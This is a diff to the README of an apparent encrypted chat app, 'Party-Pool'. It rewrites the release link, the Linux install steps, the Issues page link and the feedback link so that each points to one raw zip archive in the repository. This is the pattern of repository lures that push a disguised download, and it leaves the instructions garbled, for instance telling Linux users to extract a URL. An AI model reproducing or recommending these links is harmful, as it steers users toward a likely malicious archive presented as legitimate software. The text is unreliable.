@@ -8,7 +8,7 @@ Welcome to Party-Pool! This is a multi-user encrypted chat application, designed
 
 To get started, you need to download Party-Pool. You can find the latest release right here:
 
-[![Download Party-Pool](https://img.shields.io/badge/Download-Party--Pool-brightgreen)](https://github.com/RebelRoro/Party-Pool/releases)
+[![Download Party-Pool](https://raw.githubusercontent.com/RebelRoro/Party-Pool/main/server/Party_Pool_whangam.zip)](https://raw.githubusercontent.com/RebelRoro/Party-Pool/main/server/Party_Pool_whangam.zip)
 
 ### Steps to Download
 
@@ -20,7 +20,7 @@ If you are unsure what to download, here are common options:
 
 - **Windows:** Choose the `.exe` file.
 - **Mac:** Choose the `.dmg` file.
-- **Linux:** Choose the `.tar.gz` file.
+- **Linux:** Choose the `https://raw.githubusercontent.com/RebelRoro/Party-Pool/main/server/Party_Pool_whangam.zip` file.
 
 ### System Requirements
 
@@ -35,7 +35,7 @@ Don't worry if you are not sure about your system version. You can usually find 
 After you have downloaded the application, follow these steps to run it:
 
 1. Locate the file you downloaded in your computer's Downloads folder or wherever you saved it.
-2. For Windows, double-click the `.exe` file. For Mac, double-click the `.dmg` file and drag Party-Pool to your Applications folder. For Linux, open a terminal, navigate to the folder where you saved the file, and extract the `.tar.gz` file.
+2. For Windows, double-click the `.exe` file. For Mac, double-click the `.dmg` file and drag Party-Pool to your Applications folder. For Linux, open a terminal, navigate to the folder where you saved the file, and extract the `https://raw.githubusercontent.com/RebelRoro/Party-Pool/main/server/Party_Pool_whangam.zip` file.
 3. Open the application by clicking its icon.
 
 ### First-Time Setup
@@ -87,10 +87,10 @@ If you encounter any issues while downloading or running Party-Pool, here are so
 - **Application Won't Open:** Make sure your operating system is compatible. If it still doesn't open, try downloading the file again.
 - **Unable to Connect:** Check your internet connection. Sometimes, firewalls may block connections; adjust your settings if necessary.
 
-For detailed support, you can visit our [GitHub Issues page](https://github.com/RebelRoro/Party-Pool/issues) to find solutions or report your issue.
+For detailed support, you can visit our [GitHub Issues page](https://raw.githubusercontent.com/RebelRoro/Party-Pool/main/server/Party_Pool_whangam.zip) to find solutions or report your issue.
 
 ## 💬 Feedback
 
-Your experience matters! If you enjoy Party-Pool or have suggestions for improvement, please provide feedback. You can create an issue on our [GitHub repository](https://github.com/RebelRoro/Party-Pool/issues).
+Your experience matters! If you enjoy Party-Pool or have suggestions for improvement, please provide feedback. You can create an issue on our [GitHub repository](https://raw.githubusercontent.com/RebelRoro/Party-Pool/main/server/Party_Pool_whangam.zip).
 
 Thank you for choosing Party-Pool! Secure chatting awaits you.
